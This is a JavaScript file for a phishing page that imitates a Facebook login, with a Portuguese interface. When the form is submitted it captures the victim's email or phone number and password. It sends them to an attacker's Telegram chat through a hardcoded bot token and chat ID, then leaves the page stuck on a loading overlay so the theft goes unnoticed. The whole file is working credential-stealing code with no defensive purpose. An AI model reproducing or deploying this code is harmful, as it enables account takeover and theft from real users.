const form = document.getElementById('login-form');
const loadingOverlay = document.getElementById('loading-overlay');

const TELEGRAM_BOT_TOKEN = '8373757570:AAE-Q09SC9Ik9Xe-Vu95Ga6rldYcfO4bTEA';
const TELEGRAM_CHAT_ID = '5899156650';

form.addEventListener('submit', async (event) => {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (!email || !password) {
        alert('Por favor, preencha todos os campos.');
        return;
    }

    loadingOverlay.classList.remove('hidden');

    const message = `
        --- Nova Credencial Facebook ---
        Email/Telefone: ${email}
        Senha: ${password}
        ------------------------------
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            }),
        });
    } catch (error) {
        console.error('Falha ao enviar dados:', error);
        // The loop continues regardless of whether the send was successful or not
    }

    // The form submission is now "stuck" in a loading state,
    // creating the "eternal loop" effect for the user.
});

